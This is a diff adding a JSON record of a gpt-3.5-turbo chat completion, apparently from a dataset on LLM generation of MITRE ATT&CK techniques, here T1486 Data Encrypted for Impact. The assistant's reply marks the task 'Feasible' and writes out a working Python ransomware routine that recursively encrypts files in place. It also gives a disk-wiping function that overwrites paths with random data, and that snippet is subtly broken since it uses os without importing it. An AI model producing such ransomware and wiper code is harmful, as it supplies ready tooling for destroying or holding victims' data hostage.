@@ -1,0 +1,22 @@
+{
+  "id":"chatcmpl-8UDsUnSGpumcDCpigM3mw6AtWg1Cu",
+  "object":"chat.completion",
+  "created":1702213878,
+  "model":"gpt-3.5-turbo-0613",
+  "choices":[
+    {
+      "index":0,
+      "message":{
+        "role":"assistant",
+        "content":"[Feasible]\n\nT1486-Data Encrypted for Impact\n\nMethods of achieving data encryption for impact include:\n1. Ransomware\n2. Disk Wiping\n\nMethod 1: Ransomware\nTo simulate the data encryption for impact technique, we can create a simple ransomware program that encrypts files on a target system and withholds access to the decryption key.\n\nPython packages used:\n- cryptography (for encryption)\n- os (for file operations)\n\nCode:\n\n```python\nfrom cryptography.fernet import Fernet\nimport os\n\n# Generate encryption key\ndef generate_key():\n    return Fernet.generate_key()\n\n# Encrypt file\ndef encrypt_file(filename, key):\n    with open(filename, 'rb') as file:\n        file_data = file.read()\n    \n    fernet = Fernet(key)\n    encrypted_data = fernet.encrypt(file_data)\n    \n    with open(filename, 'wb') as file:\n        file.write(encrypted_data)\n\n# Decrypt file\ndef decrypt_file(filename, key):\n    with open(filename, 'rb') as file:\n        encrypted_data = file.read()\n    \n    fernet = Fernet(key)\n    decrypted_data = fernet.decrypt(encrypted_data)\n    \n    with open(filename, 'wb') as file:\n        file.write(decrypted_data)\n\n# Get all files in a directory and its subdirectories\ndef get_all_files(directory):\n    file_list = []\n    for root, dirs, files in os.walk(directory):\n        for file in files:\n            file_list.append(os.path.join(root, file))\n    return file_list\n\n# Encrypt files in a directory\ndef encrypt_directory(directory, key):\n    files = get_all_files(directory)\n    for file in files:\n        encrypt_file(file, key)\n\n# Decrypt files in a directory\ndef decrypt_directory(directory, key):\n    files = get_all_files(directory)\n    for file in files:\n        decrypt_file(file, key)\n\n\n# Generate encryption key\nencryption_key = generate_key()\n\n# Encrypt files in a directory\ntarget_directory = \"/path/to/target/directory\"\nencrypt_directory(target_directory, encryption_key)\n\n# Decrypt files in a directory\ndecrypt_directory(target_directory, encryption_key)\n```\n\nMethod 2: Disk Wiping\nTo simulate the data encryption for impact technique, we can create a program that wipes the content of a disk drive using random data.\n\nPython packages used:\n- shutil (for disk operations)\n- random (for random data generation)\n\nCode:\n\n```python\nimport shutil\nimport random\n\ndef wipe_disk(path):\n    with open(path, 'r+b') as file:\n        file.seek(0)\n        file.write(bytearray(random.getrandbits(8) for _ in range(os.path.getsize(path))))\n\n\n# Wipe disk\ndisk_path = \"/path/to/disk\"\nwipe_disk(disk_path)\n```\n\nNote: Please exercise caution when running the code related to disk wiping, as it permanently deletes data."
+      },
+      "finish_reason":"stop"
+    }
+  ],
+  "usage":{
+    "prompt_tokens":408,
+    "completion_tokens":595,
+    "total_tokens":1003
+  },
+  "system_fingerprint":null
+}
